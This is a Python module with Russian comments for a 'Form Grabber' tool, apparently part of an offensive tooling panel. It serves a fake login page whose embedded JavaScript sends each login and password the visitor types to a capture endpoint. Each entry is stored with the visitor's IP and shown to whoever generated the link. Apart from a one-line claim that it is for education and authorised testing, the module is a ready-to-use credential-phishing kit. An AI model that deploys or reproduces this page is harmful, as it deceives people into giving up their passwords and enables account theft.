"""
Инструмент Form Grabber: страница с формой; всё, что вводит пользователь, отправляется в панель.
Только для образования и тестирования с разрешения.
"""
import os
import random
import string
import threading
from datetime import datetime, timezone
from typing import Any

from .base import ToolBase

_CAPTURES: dict[str, list[dict]] = {}
_LOCK = threading.Lock()


def _generate_token(length: int = 10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def get_or_create_token() -> str:
    """Возвращает новый токен и инициализирует список захватов."""
    token = _generate_token()
    with _LOCK:
        _CAPTURES[token] = []
    return token


def add_capture(token: str, field: str, value: str, ip: str) -> bool:
    """Добавляет запись о вводе. Возвращает True если токен существует."""
    with _LOCK:
        if token not in _CAPTURES:
            _CAPTURES[token] = []
        _CAPTURES[token].append({
            "ts": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
            "field": field or "",
            "value": value or "",
            "ip": ip or "",
        })
    return True


def get_captures(token: str, limit: int = 200) -> list[dict]:
    """Возвращает список захватов для токена."""
    with _LOCK:
        items = (_CAPTURES.get(token) or [])[-limit:]
    return list(reversed(items))


def get_grab_page_html(token: str) -> str:
    """HTML страницы-ловушки: форма, при вводе в поля данные отправляются в API (тот же хост)."""
    api_capture = "/api/tools/formgrab/capture"
    return """<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Вход</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background: #1a1a1e; color: #e0e0e0; margin: 0; padding: 2rem; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .box { background: #25252a; border-radius: 12px; padding: 2rem; width: 100%; max-width: 360px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
    h1 { margin: 0 0 1.5rem; font-size: 1.5rem; font-weight: 600; }
    label { display: block; margin-bottom: 0.35rem; font-size: 0.9rem; color: #a0a0a0; }
    input { width: 100%; padding: 0.75rem 1rem; margin-bottom: 1rem; border: 1px solid #3a3a40; border-radius: 8px; background: #1a1a1e; color: #e0e0e0; font-size: 1rem; }
    input:focus { outline: none; border-color: #4a9e5f; }
    button { width: 100%; padding: 0.85rem; background: #4a9e5f; color: #fff; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; }
    button:hover { background: #5ab56f; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Вход в систему</h1>
    <form id="f">
      <label for="login">Логин</label>
      <input type="text" id="login" name="login" placeholder="Введите логин" autocomplete="username">
      <label for="pass">Пароль</label>
      <input type="password" id="pass" name="password" placeholder="Введите пароль" autocomplete="current-password">
      <button type="submit">Войти</button>
    </form>
  </div>
  <script>
(function() {
  var token = """ + repr(token) + """;
  var api = """ + repr(api_capture) + """;

  function send(field, value) {
    if (!value) return;
    var x = new XMLHttpRequest();
    x.open("POST", api, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({ token: token, field: field, value: value }));
  }

  var form = document.getElementById("f");
  form.querySelectorAll("input").forEach(function(inp) {
    inp.addEventListener("change", function() { send(inp.name || inp.id, inp.value); });
    inp.addEventListener("blur", function() { send(inp.name || inp.id, inp.value); });
  });
  form.addEventListener("submit", function(e) {
    e.preventDefault();
    form.querySelectorAll("input").forEach(function(inp) { send(inp.name || inp.id, inp.value); });
    setTimeout(function() { form.reset(); }, 100);
  });
})();
  </script>
</body>
</html>"""


class ToolFormgrab(ToolBase):
    @property
    def tool_id(self) -> str:
        return "formgrab"

    @property
    def name(self) -> str:
        return "Захват форм"

    @property
    def description(self) -> str:
        return "Ссылка на страницу с формой: всё, что введёт пользователь, появится в панели."

    def run(self, params: dict[str, Any]) -> dict[str, Any]:
        """Создание новой ссылки (генерация токена)."""
        token = get_or_create_token()
        return {"success": True, "token": token}
